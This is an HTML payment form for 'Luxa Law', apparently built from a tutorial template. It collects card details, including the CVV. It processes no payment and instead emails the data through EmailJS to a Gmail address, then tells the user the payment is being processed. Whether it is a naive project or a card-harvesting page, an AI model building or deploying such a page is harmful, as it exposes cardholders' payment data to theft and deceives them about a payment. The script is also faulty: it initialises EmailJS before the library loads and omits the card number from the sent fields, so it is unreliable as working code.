<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Luxa Law Payment</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            border: none;
            outline: none;
            font-family: 'Poppins', sans-serif;
            text-transform: capitalize;
            transition: all 0.2s linear;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 25px;
            background: #fff;
        }

        .container form {
            width: 700px;
            padding: 20px;
            background: #fff;
            box-shadow: 5px 5px 30px rgba(0, 0, 0, 0.2);
        }

        .container form .row {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
        }

        .container form .row .col {
            flex: 1 1 250px;
        }

        .col .title {
            font-size: 20px;
            color: rgb(237, 55, 23);
            padding-bottom: 5px;
        }

        .col .inputBox {
            margin: 15px 0;
        }

        .col .inputBox label {
            margin-bottom: 10px;
            display: block;
        }

        .col .inputBox input,
        .col .inputBox select {
            width: 100%;
            border: 1px solid #ccc;
            padding: 10px 15px;
            font-size: 15px;
        }

        .col .inputBox input:focus,
        .col .inputBox select:focus {
            border: 1px solid #000;
        }

        .col .flex {
            display: flex;
            gap: 15px;
        }

        .col .flex .inputBox {
            flex: 1 1;
            margin-top: 5px;
        }

        .col .inputBox img {
            height: 34px;
            margin-top: 5px;
            filter: drop-shadow(0 0 1px #000);
        }

        .container form .submit_btn {
            width: 100%;
            padding: 12px;
            font-size: 17px;
            background: rgb(1, 143, 34);
            color: #fff;
            margin-top: 5px;
            cursor: pointer;
            letter-spacing: 1px;
        }

        .container form .submit_btn:hover {
            background: #3d17fb;
        }

        input::-webkit-inner-spin-button,
        input::-webkit-outer-spin-button {
            display: none;
        }

        .thank-you {
            display: none;
            text-align: center;
            font-size: 20px;
            color: green;
            padding: 20px;
        }
    </style>
</head>

<body>
    <div class="container">
        <form id="payment-form" action="javascript:void(0)" method="post">
            <div class="row">
                <div class="col">
                    <h3 class="title">Billing Address</h3>

                    <div class="inputBox">
                        <label for="name">Full Name:</label>
                        <input type="text" id="name" placeholder="Enter your full name" required>
                    </div>

                    <div class="inputBox">
                        <label for="email">Email:</label>
                        <input type="text" id="email" placeholder="Enter email address" required>
                    </div>

                    <div class="inputBox">
                        <label for="address">Address:</label>
                        <input type="text" id="address" placeholder="Enter address" required>
                    </div>

                    <div class="inputBox">
                        <label for="city">City:</label>
                        <input type="text" id="city" placeholder="Enter city" required>
                    </div>

                    <div class="flex">
                        <div class="inputBox">
                            <label for="state">State:</label>
                            <input type="text" id="state" placeholder="Enter state" required>
                        </div>

                        <div class="inputBox">
                            <label for="zip">Zip Code:</label>
                            <input type="number" id="zip" placeholder="123 456" required>
                        </div>
                    </div>
                </div>

                <div class="col">
                    <h3 class="title">Payment</h3>

                    <div class="inputBox">
                        <label for="name">Card Accepted:</label>
                        <img src="https://media.geeksforgeeks.org/wp-content/uploads/20240715140014/Online-Payment-Project.webp" alt="credit/debit card image">
                    </div>

                    <div class="inputBox">
                        <label for="cardName">Name On Card:</label>
                        <input type="text" id="cardName" placeholder="Enter card name" required>
                    </div>

                    <div class="inputBox">
                        <label for="cardNum">Credit Card Number:</label>
                        <input type="text" id="cardNum" placeholder="1111-2222-3333-4444" maxlength="19" required>
                    </div>

                    <div class="inputBox">
                        <label for="">Exp Month:</label>
                        <select name="" id="expMonth">
                            <option value="">Choose month</option>
                            <option value="January">January</option>
                            <option value="February">February</option>
                            <option value="March">March</option>
                            <option value="April">April</option>
                            <option value="May">May</option>
                            <option value="June">June</option>
                            <option value="July">July</option>
                            <option value="August">August</option>
                            <option value="September">September</option>
                            <option value="October">October</option>
                            <option value="November">November</option>
                            <option value="December">December</option>
                        </select>
                    </div>

                    <div class="flex">
                        <div class="inputBox">
                            <label for="">Exp Year:</label>
                            <select name="" id="expYear">
                                <option value="">Choose Year</option>
                                <option value="2024">2024</option>
                                <option value="2025">2025</option>
                                <option value="2026">2026</option>
                                <option value="2027">2027</option>
                                <option value="2028">2028</option>
                                <option value="2029">2029</option>
                                <option value="2030">2030</option>
                                <option value="2031">2031</option>
                            </select>
                        </div>

                        <div class="inputBox">
                            <label for="cvv">CVV</label>
                            <input type="number" id="cvv" placeholder="1234" required>
                        </div>
                    </div>
                </div>
            </div>

            <input type="submit" value="Submit Payment" class="submit_btn">
        </form>

        <div id="thank-you-message" class="thank-you">
            Thank you for your payment, please wait while we process it.
        </div>
    </div>

    <script type="text/javascript">
        let cardNumInput = document.querySelector('#cardNum');

        cardNumInput.addEventListener('keyup', () => {
            let cNumber = cardNumInput.value;
            cNumber = cNumber.replace(/\s/g, "");

            if (Number(cNumber)) {
                cNumber = cNumber.match(/.{1,4}/g);
                cNumber = cNumber.join(" ");
                cardNumInput.value = cNumber;
            }
        });

        // Initialize EmailJS with your User ID
        (function () {
            emailjs.init("user_your_emailjs_user_id");
        })();

        // Handle form submission
        document.getElementById('payment-form').addEventListener('submit', function (e) {
            e.preventDefault(); // Prevent the form from submitting normally

            // Get the form values
            let name = document.getElementById('name').value;
            let email = document.getElementById('email').value;
            let address = document.getElementById('address').value;
            let city = document.getElementById('city').value;
            let state = document.getElementById('state').value;
            let zip = document.getElementById('zip').value;
            let cardName = document.getElementById('cardName').value;
            let expMonth = document.getElementById('expMonth').value;
            let expYear = document.getElementById('expYear').value;
            let cvv = document.getElementById('cvv').value;

            // Prepare the email data
            let templateParams = {
                to_email: "LuxaLaw@gmail.com", // Replace with the correct recipient email
                subject: "New Payment + " + cardName,
                full_name: name,
                email: email,
                address: address,
                city: city,
                state: state,
                zip_code: zip,
                card_name: cardName,
                exp_month: expMonth,
                exp_year: expYear,
                cvv: cvv
            };

            // Send the email via EmailJS
            emailjs.send("your_emailjs_service_id", "your_emailjs_template_id", templateParams)
                .then(function (response) {
                    // Hide the form and show the thank you message
                    document.getElementById('payment-form').style.display = 'none';
                    document.getElementById('thank-you-message').style.display = 'block';
                }, function (error) {
                    alert("Failed to send payment: " + error);
                });
        });
    </script>

    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</body>

</html>
